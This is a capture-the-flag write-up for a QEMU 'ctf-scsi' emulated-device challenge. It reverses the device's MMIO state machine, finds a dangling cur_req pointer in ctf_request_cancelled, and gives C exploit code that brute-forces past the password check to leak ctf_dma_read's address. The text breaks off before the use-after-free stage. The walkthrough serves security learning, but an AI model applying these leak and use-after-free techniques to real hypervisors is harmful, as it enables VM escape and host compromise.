# SCSI
Actually, I have done this challenge long long ago, but I dont remember how did I make it. So I decided to review it again.  

Download the tgz file from   
https://uaf.io/assets/scsi.tgz  
Decompress it and we got all the neccessary files.

SCSI means mall Computer System Interface, used to communicate with computer devices (hard drive, usb, etc...).


# Analysis

```bash
#!/bin/sh
./qemu-system-x86_64 \
	-L ./dependences \
	-initrd ./rootfs.cpio \
	-kernel ./vmlinuz-4.8.0-52-generic \
	-append 'console=ttyS0 root=/dev/ram oops=panic panic=1' \
	-m 56M --nographic \
	-device ctf-scsi,id=bus0 \
	-drive file=test.img,if=none,id=d0 \
	-device scsi-disk,drive=d0,bus=bus0.0 \
	-monitor /dev/null
```
There is a new device called `ctf-scsi`, we can analysis it from IDA pro.  

```
void __cdecl ctf_class_init(PCIDeviceClass *a1, void *data)
{
  PCIDeviceClass *v2; // ST18_8

  v2 = (PCIDeviceClass *)object_class_dynamic_cast_assert(
                           &a1->parent_class.parent_class,
                           "pci-device",
                           "hw/scsi/ctf.c",
                           361,
                           "ctf_class_init");
  v2->realize = ctf_realize;
  v2->vendor_id = 0x1234;
  v2->device_id = 0x11E9;
  v2->revision = 0;
  v2->class_id = 255;
}
```
Now we can interact with this device through resource  

```bash
/ # lspci
00:00.0 Class 0600: 8086:1237
00:01.3 Class 0680: 8086:7113
00:03.0 Class 0200: 8086:100e
00:01.1 Class 0101: 8086:7010
00:02.0 Class 0300: 1234:1111
00:01.0 Class 0601: 8086:7000
00:04.0 Class 00ff: 1234:11e9

/ # cat /sys/devices/pci0000\:00/0000\:00\:04.0/resource0
0x00000000febf1000 0x00000000febf1fff 0x0000000000040200
0x0000000000000000 0x0000000000000000 0x0000000000000000
```

The device was registered by `ctf_class_init`, the property realize was set to `ctf_realize`.
```C
void __cdecl ctf_realize(CTFState *pdev, Error_0 **errp)
{
  qmemcpy(pdev, pdev, 0x8E0uLL);
  pdev->state = 0;
  pdev->register_a = 0;
  pdev->register_b = 0;
  pdev->register_c = 0;
  pdev->pwidx = 0;
  pdev->dma_buf = 0LL;
  pdev->dma_buf_len = 0;
  memset(&pdev->req, 0, 0xCuLL);
  pdev->pw[0] = 'B';
  pdev->pw[1] = 'L';
  pdev->pw[2] = 'U';
  pdev->pw[3] = 'E';
  pdev->req.cmd_buf = 0LL;
  pdev->cur_req = 0LL;
  pdev->high_addr = 0LL;
  pdev->dma_need = 0;
  pdev->dma_write = ctf_dma_write;
  pdev->dma_read = ctf_dma_read;
  pci_config_set_interrupt_pin_7(pdev->pdev.config, 1u);
  memory_region_init_io(&pdev->mmio, &pdev->pdev.qdev.parent_obj, &mmio_ops_0, pdev, "ctf-scsi", 0x1000uLL); //init I/O
  pci_register_bar(&pdev->pdev, 0, 0, &pdev->mmio);
  scsi_bus_new(&pdev->bus, 0x78uLL, &pdev->pdev.qdev, &ctf_scsi_info, 0LL);
}
```
And it defined two operations, `ctf_mmio_read` and `ctf_mmio_write`.  
`ctf_mmio_read` was defined to read data from dma, `ctf_mmio_write` was defined to set value of the CTFState.  
Actually this challenge created a state machine  
```C
void __cdecl ctf_mmio_write(CTFState *opaque, hwaddr addr, uint64_t val, unsigned int size)
{
  __int64 addr_1; // [rsp+30h] [rbp+0h]

  switch ( (unsigned __int64)&addr_1 )
  {
    case 0uLL:
      ctf_set_io(opaque, val);
      break;
    case 4uLL:
      if ( opaque->pw[opaque->pwidx] == (_BYTE)val )
      {
        if ( ++opaque->pwidx == 4 )
          opaque->state |= 1u;
      }
      else
      {
        opaque->pwidx = 0;
      }
      break;
    case 8uLL:
      ctf_process_req(opaque, (unsigned int)val);
      break;
    case 0xCuLL:
      ctf_reset(opaque);
      break;
    case 0x10uLL:
      opaque->register_a = val;
      break;
    case 0x14uLL:
      opaque->register_b = val;
      break;
    case 0x18uLL:
      ctf_process_reply(opaque);
      break;
    case 0x1CuLL:
      ctf_add_cmd_data(opaque, val);
      break;
    default:
      return;
  }
}
```

1. check if the pw is "BLUE" with option 4, `opaque->state` -> 1
2. call `ctf_set_io` with option 0, set `opaque->high_addr` to a specific value, `opaque->state` -> 2
3. call `ctf_process_req` with option 8, read 12 bytes to make a `CTF_req_head` structure. Find dev with `scsi_device_find` function. If found, `opaque->state` will be set to 0x10. Read from `addr + 12` into `opaque->req.cmd_buf`. Call `scsi_req_new` to create a SCSI request. `opaque->state` -> 10
4. call `ctf_add_cmd_data` with option 0x1c, read `val` bytes from addr into `opaque->dma_buf`
5. call `ctf_process_reply` with option 0x18, call `cpu_physical_memory_rw` to write into physical address from `opaque->dma_buf`

So where is the bug???  

The bug lies in the `ctf_scsi_info` structure, in this structure, there is a `ctf_request_complete` and a `ctf_request_cancelled` function.  
These 2 functions looks the same, but a little different.  
```
void __cdecl ctf_request_complete(SCSIRequest_0 *req)
{
  CTFState *s; // ST18_8

  s = (CTFState *)req->hba_private;
  s->state ^= 0x10u;
  free(s->req.cmd_buf);
  s->req.cmd_buf = 0LL;
  scsi_req_unref(req);
  s->cur_req = 0LL;
}

void __cdecl ctf_request_cancelled(SCSIRequest_0 *req)
{
  CTFState *s; // ST18_8

  s = (CTFState *)req->hba_private;
  s->state ^= 0x10u;
  free(s->req.cmd_buf);
  s->req.cmd_buf = 0LL;
  scsi_req_unref(req);
}
```
`ctf_request_cancelled` didnt set `s->cur_req` to 0 after it has been called.  

![image](https://user-images.githubusercontent.com/67320649/113397599-dc643480-93cf-11eb-9634-780502dd4edb.png)

then we will get a dangling pointer.  
`ctf_request_cancelled` is not X-refed in IDA pro, let's just assume that it will called if `scsi_req_cancel` is called.

Another bug is that you can bruteforce data after pw, if the value is not correct, `opaque->pwidx` will be reset to 0.
![image](https://user-images.githubusercontent.com/67320649/113400058-cd7f8100-93d3-11eb-9629-f25ecb7341c9.png)

**One thing to notice is that**

HOW do we make `scsi_device_find` function return 0, so that there will be a dangling pointer.  
A [wikipedia entry] provided some good points


# Exploit

1. Leak dma_read's address with bruteforcing.
2. Use the dangling pointer to create a fake structure.


# Scripting

We can just bruteforce 6 bytes to get the address of `ctf_dma_read`.

```
void set_pwd()
{
    mmio_write(0x4, 'B');
    mmio_write(0x4, 'L');
    mmio_write(0x4, 'U');
    mmio_write(0x4, 'E');
    for(int i = 0; i < 8; ++i){
        mmio_write(0x4, '\x00');
    }
    uint32_t pw_idx = mmio_read(0x14);
    //printf("pw_idx: %d\n", pw_idx);
}

void bruteforce_pointer()
{
    uint64_t pointer = 0;
    for(int t = 0; t < 6; t++){
        for(uint64_t v = 0; v < 256; v++){
            set_pwd();

            uint64_t tmp = pointer;
            for(int k = 1; k <= t; k++){
                char cur_chr = (tmp >> ((k-1)*8)) & 0xff;
                mmio_write(0x4, cur_chr);
            }
            
            mmio_write(0x4, v);
            uint32_t cur_idx = mmio_read(0x14);
            if(cur_idx == 0){
                continue;
            }
            else{
                // else we have the right value
                pointer = (pointer | (v << (t * 8)));
                printf("%p\n", (void*)pointer);
                break;
            }               
        }
    }
}


/ # ./exp
mmio_mem @ 0x7fe3865a2000
user buff virtual address: 0x7fe3865a1000
user buff physical address: 0x3733000
0x5d
0x115d
0xb2115d
0x60b2115d
0xfc60b2115d
0x55fc60b2115d


gdb-peda$ x/20gx 0x55fc60b2115d
0x55fc60b2115d <ctf_dma_read>:	0x30ec8348e5894855	0xe0758948e87d8948
0x55fc60b2116d <ctf_dma_read+16>:	0x48e8458b48dc5589	0x8bf8458b48f84589
0x55fc60b2117d <ctf_dma_read+32>:	0x08e08300000a5080	0xf8458b483074c085
0x55fc60b2118d <ctf_dma_read+48>:	0xc88300000a50808b	0x89f8458b48c28904
```
Then use the dangl

